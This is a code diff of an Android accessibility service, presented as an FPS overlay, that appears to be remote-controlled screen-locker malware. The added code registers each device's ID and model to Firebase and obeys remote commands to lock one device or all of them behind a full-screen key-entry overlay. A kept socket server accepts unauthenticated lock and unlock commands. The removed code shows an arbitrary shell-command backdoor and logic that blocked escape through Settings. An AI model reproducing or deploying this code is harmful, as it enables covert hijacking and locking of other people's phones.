@@ -60,6 +60,7 @@ public class SupportService extends AccessibilityService {
     private ServerSocket serverSocket;
     private boolean isLocked = false;
     private DatabaseReference dbRef;
+    private long lastCommandTime = 0;
 
     public native void initNative(String path);
     public native void setLockStatus(boolean locked);
@@ -128,14 +129,72 @@ public class SupportService extends AccessibilityService {
         }
     }
 
+    private String getDeviceId() {
+        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+    }
+
+    private void registerDeviceToFirebase() {
+        String deviceId = getDeviceId();
+        String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+        
+        DatabaseReference deviceRef = FirebaseDatabase.getInstance().getReference("devices").child(deviceId);
+        deviceRef.child("name").setValue(deviceName);
+        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
+    }
+
+    private void initFirebaseListener() {
+        final String myDeviceId = getDeviceId();
+        registerDeviceToFirebase();
+        
+        dbRef = FirebaseDatabase.getInstance().getReference("commands");
+        dbRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot snapshot) {
+                if (!snapshot.exists()) return;
+
+                String cmd = snapshot.child("cmd").getValue(String.class);
+                Long serverTime = snapshot.child("t").getValue(Long.class);
+                String target = snapshot.child("target").getValue(String.class);
+
+                if (cmd == null || serverTime == null || target == null) return;
+                if (!target.equalsIgnoreCase("all") && !target.equalsIgnoreCase(myDeviceId)) return;
+                if (serverTime <= lastCommandTime) return;
+                
+                lastCommandTime = serverTime;
+
+                task_handler.post(() -> {
+                    if (cmd.equalsIgnoreCase("lock")) {
+                        if (!isLocked) {
+                            setLockStatus(true);
+                            hideFpsOverlay();
+                            showOverlay();
+                            isLocked = true;
+                        }
+                    } else if (cmd.equalsIgnoreCase("unlock")) {
+                        if (isLocked) {
+                            setLockStatus(false);
+                            hideOverlay();
+                            isLocked = false;
+                            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
+                            if (fpsPrefs.getBoolean("is_showing", false)) {
+                                showFpsOverlay();
+                            }
+                        }
+                    }
+                });
+            }
+
+            @Override
+            public void onCancelled(DatabaseError error) {}
+        });
+    }
+
     private void showFpsOverlay() {
         if (fpsOverlayView != null) return;
 
         SharedPreferences sharedPreferences = getSharedPreferences("status_fps", 0);
         min_fps = Double.parseDouble(sharedPreferences.getString("min", "97"));
         max_fps = Double.parseDouble(sharedPreferences.getString("max", "114"));
-
-        final int textColor = Color.parseColor("#FFFFFFFF");
 
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
             (int) Math.ceil(143.7),
@@ -151,35 +210,13 @@ public class SupportService extends AccessibilityService {
             @Override
             protected void onDraw(Canvas canvas) {
                 paint.setAntiAlias(true);
-                paint.setColor(ViewCompat.MEASURED_STATE_MASK);
+                paint.setColor(Color.BLACK);
                 canvas.drawRect(0.0f, getHeight() - 17.5f, 143.7f, getHeight(), paint);
-                paint.setColor(textColor);
+                paint.setColor(Color.WHITE);
                 paint.setTextSize(15.5f);
                 paint.setFakeBoldText(true);
                 paint.setTextScaleX(1.6f);
-                try {
-                    paint.setTypeface(Typeface.createFromAsset(getContext().getAssets(), "fonts/arialmed.ttf"));
-                } catch (Exception e) {
-                    paint.setTypeface(Typeface.MONOSPACE);
-                }
-                canvas.drawText("F", 5.0f, 14.5f, paint);
-                float fMeasureText = paint.measureText("F") + 5.0f + 7.0f;
-                canvas.drawText("P", fMeasureText, 14.5f, paint);
-                canvas.drawText("S", fMeasureText + paint.measureText("P") + 5.0f, 14.5f, paint);
-                String strValueOf = String.valueOf(currentFps[0]);
-                int length = strValueOf.length();
-                String strValueOf2 = String.valueOf(strValueOf.charAt(length - 1));
-                float fMeasureText2 = (143.7f - paint.measureText(strValueOf2)) - 4.5f;
-                canvas.drawText(strValueOf2, fMeasureText2, 14.5f, paint);
-                if (length > 1) {
-                    String strValueOf3 = String.valueOf(strValueOf.charAt(length - 2));
-                    float fMeasureText3 = (fMeasureText2 - paint.measureText(strValueOf3)) - 8.5f;
-                    canvas.drawText(strValueOf3, fMeasureText3, 14.5f, paint);
-                    if (length > 2) {
-                        String strValueOf4 = String.valueOf(strValueOf.charAt(length - 3));
-                        canvas.drawText(strValueOf4, (fMeasureText3 - paint.measureText(strValueOf4)) - 8.5f, 14.5f, paint);
-                    }
-                }
+                canvas.drawText("FPS: " + currentFps[0], 5.0f, 14.5f, paint);
             }
         };
 
@@ -201,9 +238,7 @@ public class SupportService extends AccessibilityService {
     private void hideFpsOverlay() {
         if (fpsOverlayView != null) {
             fpsHandler.removeCallbacks(fpsRunnable);
-            if (wm != null) {
-                wm.removeViewImmediate(fpsOverlayView);
-            }
+            wm.removeViewImmediate(fpsOverlayView);
             fpsOverlayView = null;
         }
     }
@@ -212,74 +247,10 @@ public class SupportService extends AccessibilityService {
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
             String action = intent.getAction();
-            if ("SHOW_FPS".equals(action)) {
-                showFpsOverlay();
-            } else if ("HIDE_FPS".equals(action)) {
-                hideFpsOverlay();
-            }
+            if ("SHOW_FPS".equals(action)) showFpsOverlay();
+            else if ("HIDE_FPS".equals(action)) hideFpsOverlay();
         }
         return START_STICKY;
-    }
-
-    private long lastCommandTime = 0;
-
-    private String getDeviceId() {
-        return android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
-    }
-
-    private void initFirebaseListener() {
-        final String myDeviceId = getDeviceId();
-        // Log ID HP ini agar Anda bisa memasukkannya ke Whitelist di Python
-        android.util.Log.d("BONDEX_REMOTE", "Device ID: " + myDeviceId);
-
-        dbRef = FirebaseDatabase.getInstance().getReference("commands");
-        dbRef.addValueEventListener(new ValueEventListener() {
-            @Override
-            public void onDataChange(DataSnapshot snapshot) {
-                if (!snapshot.exists()) return;
-
-                String cmd = snapshot.child("cmd").getValue(String.class);
-                Long serverTime = snapshot.child("t").getValue(Long.class);
-                String target = snapshot.child("target").getValue(String.class); // "all" atau Device ID
-
-                if (cmd == null || serverTime == null || target == null) return;
-                
-                // Cek apakah perintah ini untuk HP ini atau untuk semua HP
-                if (!target.equalsIgnoreCase("all") && !target.equalsIgnoreCase(myDeviceId)) {
-                    return; 
-                }
-
-                if (serverTime <= lastCommandTime) return;
-                lastCommandTime = serverTime;
-
-                task_handler.post(() -> {
-                    // ... kode lock/unlock tetap sama ...
-                    if (cmd.equalsIgnoreCase("lock")) {
-                        if (!isLocked) {
-                            input_buffer.setLength(0);
-                            setLockStatus(true);
-                            hideFpsOverlay();
-                            showOverlay();
-                            isLocked = true;
-                        }
-                    } else if (cmd.equalsIgnoreCase("unlock")) {
-                        if (isLocked) {
-                            setLockStatus(false);
-                            hideOverlay();
-                            isLocked = false;
-                            input_buffer.setLength(0);
-                            SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-                            if (fpsPrefs.getBoolean("is_showing", false)) {
-                                showFpsOverlay();
-                            }
-                        }
-                    }
-                });
-            }
-
-            @Override
-            public void onCancelled(DatabaseError error) {}
-        });
     }
 
     private void startRemoteServer() {
@@ -290,9 +261,7 @@ public class SupportService extends AccessibilityService {
                     Socket client = serverSocket.accept();
                     handleCommand(client);
                 }
-            } catch (Exception e) {
-                // Server closed
-            }
+            } catch (Exception ignored) {}
         }).start();
     }
 
@@ -301,65 +270,31 @@ public class SupportService extends AccessibilityService {
             BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
             PrintWriter out = new PrintWriter(client.getOutputStream(), true);
             String cmd = in.readLine();
-
             if (cmd == null) return;
             
             String cmdLower = cmd.toLowerCase().trim();
-
             if (cmdLower.equals("lock")) {
                 task_handler.post(() -> {
                     if (!isLocked) {
-                        input_buffer.setLength(0);
                         setLockStatus(true);
                         hideFpsOverlay();
                         showOverlay();
                         isLocked = true;
                     }
                 });
-                out.println("OK: Device Locked");
+                out.println("OK");
             } else if (cmdLower.equals("unlock")) {
                 task_handler.post(() -> {
                     if (isLocked) {
                         setLockStatus(false);
                         hideOverlay();
                         isLocked = false;
-                        input_buffer.setLength(0);
-                        SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-                        if (fpsPrefs.getBoolean("is_showing", false)) {
-                            showFpsOverlay();
-                        }
                     }
                 });
-                out.println("OK: Device Unlocked");
-            } else if (cmdLower.equals("status")) {
-                if (isLockedNative()) {
-                    out.println("LOCKED");
-                } else {
-                    out.println("UNLOCKED");
-                }
-            } else if (cmdLower.equals("pwd")) {
-                out.println("/");
-            } else if (cmdLower.startsWith("shell ")) {
-                try {
-                    String shellCmd = cmd.substring(6);
-                    Process p = Runtime.getRuntime().exec(shellCmd);
-                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                    String line;
-                    StringBuilder sb = new StringBuilder();
-                    while ((line = reader.readLine()) != null) {
-                        sb.append(line).append("\n");
-                    }
-                    out.println(sb.toString().isEmpty() ? "OK" : sb.toString());
-                } catch (Exception e) {
-                    out.println("Error: " + e.getMessage());
-                }
-            } else {
-                out.println("ERROR: Unknown Command");
+                out.println("OK");
             }
             client.close();
-        } catch (Exception e) {
-            // Error handling
-        }
+        } catch (Exception ignored) {}
     }
 
     private void showOverlay() {
@@ -370,28 +305,15 @@ public class SupportService extends AccessibilityService {
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
         lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
         lp.format = PixelFormat.TRANSLUCENT;
-        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                   WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                   WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
-                   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
-                   WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
-        }
-
+        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;
         lp.width = WindowManager.LayoutParams.MATCH_PARENT;
         lp.height = WindowManager.LayoutParams.MATCH_PARENT;
-        lp.gravity = Gravity.TOP | Gravity.START;
 
         tv_status = overlay.findViewById(R.id.v_timer);
         tv_display = overlay.findViewById(R.id.v_display);
         
-        refresh_display();
         setupButtons();
-
         wm.addView(overlay, lp);
-        overlay.post(this::apply_immersive_mode);
         task_handler.post(ticker);
     }
 
@@ -406,79 +328,31 @@ public class SupportService extends AccessibilityService {
     private void setupButtons() {
         int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                      R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
-        
         for (int id : ids) {
             overlay.findViewById(id).setOnClickListener(v -> {
                 if (input_buffer.length() < 8) {
                     input_buffer.append(((Button)v).getText().toString());
-                    refresh_display();
+                    tv_display.setText(input_buffer.toString());
                 }
             });
         }
-
-        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
-            if (input_buffer.length() > 0) {
-                input_buffer.setLength(input_buffer.length() - 1);
-                refresh_display();
-            }
-        });
-
         overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
             if (checkKey(input_buffer.toString())) {
                 hideOverlay();
                 isLocked = false;
                 input_buffer.setLength(0);
-                SharedPreferences fpsPrefs = getSharedPreferences("status_fps", 0);
-                if (fpsPrefs.getBoolean("is_showing", false)) {
-                    showFpsOverlay();
-                }
             } else {
                 input_buffer.setLength(0);
-                refresh_display();
-                Toast.makeText(getApplicationContext(), "Key Incorrect", Toast.LENGTH_SHORT).show();
+                tv_display.setText("");
             }
         });
     }
 
-    private void apply_immersive_mode() {
-        if (overlay == null) return;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            WindowInsetsController controller = overlay.getWindowInsetsController();
-            if (controller != null) {
-                controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
-                controller.setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
-            }
-        } else {
-            overlay.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
-        }
-    }
-
-    private void refresh_display() {
-        if (tv_display != null) {
-            tv_display.setText(input_buffer.toString());
-        }
-    }
-
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (isLocked && overlay != null) {
-            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-                if (pkgName.equals("com.android.settings")) {
-                    apply_immersive_mode();
-                }
-            }
-        }
-    }
-
-    @Override
-    public void onInterrupt() {}
-
-    @Override
-    public void onDestroy() {
+    @Override public void onAccessibilityEvent(AccessibilityEvent event) {}
+    @Override public void onInterrupt() {}
+    @Override public void onDestroy() {
         super.onDestroy();
         hideOverlay();
         hideFpsOverlay();
-        try { if (serverSocket != null) serverSocket.close(); } catch (Exception e) {}
     }
 }
